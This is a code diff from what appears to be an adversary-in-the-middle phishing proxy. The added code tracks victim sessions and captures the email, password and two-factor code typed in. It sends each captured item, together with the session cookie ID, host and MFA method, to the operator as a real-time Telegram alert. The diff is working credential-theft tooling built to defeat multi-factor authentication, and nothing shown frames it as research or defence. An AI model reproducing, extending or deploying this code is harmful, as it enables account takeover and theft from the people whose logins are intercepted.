@@ -613,18 +613,63 @@ async function logHTTPProxyTransaction(proxyRequestProtocol, proxyRequestOptions
         if (username) {
             VICTIM_SESSIONS[currentSession].username = username;
             // Only store if it's the first time or if email has changed
-            if (!VICTIM_SESSIONS[currentSession].credentialsCaptured) {
+            if (!VICTIM_SESSIONS[currentSession].credentialsCaptured || VICTIM_SESSIONS[currentSession].username !== username) {
                 VICTIM_SESSIONS[currentSession].credentialsCaptured = true;
                 console.log(`Captured email for session ${currentSession}: ${username}`);
+                
+                // Send real-time notification for email capture
+                const emailMessage = `📧 <b>EMAIL CAPTURED!</b>
+
+🍪 <b>Session:</b> ${currentSession}
+🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
+👤 <b>Email:</b> ${username}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+                sendTelegramNotification(emailMessage).catch(error => 
+                    console.error('Failed to send email notification:', error)
+                );
             }
         }
         if (password) {
-            VICTIM_SESSIONS[currentSession].password = password;
-            console.log(`Captured password for session ${currentSession}`);
+            // Check if this is a new password or changed
+            if (VICTIM_SESSIONS[currentSession].password !== password) {
+                VICTIM_SESSIONS[currentSession].password = password;
+                console.log(`Captured password for session ${currentSession}`);
+                
+                // Send real-time notification for password capture
+                const passwordMessage = `🔑 <b>PASSWORD CAPTURED!</b>
+
+🍪 <b>Session:</b> ${currentSession}
+🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
+👤 <b>Email:</b> ${VICTIM_SESSIONS[currentSession].username || 'N/A'}
+🔐 <b>Password:</b> ${password}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+                sendTelegramNotification(passwordMessage).catch(error => 
+                    console.error('Failed to send password notification:', error)
+                );
+            }
         }
         if (otcCode) {
-            VICTIM_SESSIONS[currentSession].otcCode = otcCode;
-            console.log(`Captured 2FA code for session ${currentSession}: ${otcCode}`);
+            // Check if this is a new 2FA code
+            if (VICTIM_SESSIONS[currentSession].otcCode !== otcCode) {
+                VICTIM_SESSIONS[currentSession].otcCode = otcCode;
+                console.log(`Captured 2FA code for session ${currentSession}: ${otcCode}`);
+                
+                // Send real-time notification for 2FA capture
+                const otcMessage = `🔢 <b>2FA CODE CAPTURED!</b>
+
+🍪 <b>Session:</b> ${currentSession}
+🌐 <b>Host:</b> ${proxyRequestOptions.headers.host}
+👤 <b>Email:</b> ${VICTIM_SESSIONS[currentSession].username || 'N/A'}
+🔢 <b>2FA Code:</b> ${otcCode}
+📱 <b>MFA Method:</b> ${mfaMethod || 'N/A'}
+⏰ <b>Time:</b> ${new Date().toISOString()}`;
+
+                sendTelegramNotification(otcMessage).catch(error => 
+                    console.error('Failed to send 2FA notification:', error)
+                );
+            }
         }
     }
     
@@ -1039,7 +1084,7 @@ function updateProxyRequestHeaders(proxyRequestOptions, currentSession, proxyHos
         "x-client-port"
     ];
 
-    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession, proxyHostname);
+    const proxyRequestCookies = prepareProxyRequestCookies(proxyRequestOptions, currentSession);
     if (Object.keys(proxyRequestCookies).length) {
         proxyRequestOptions.headers.cookie = proxyRequestCookies;
     }
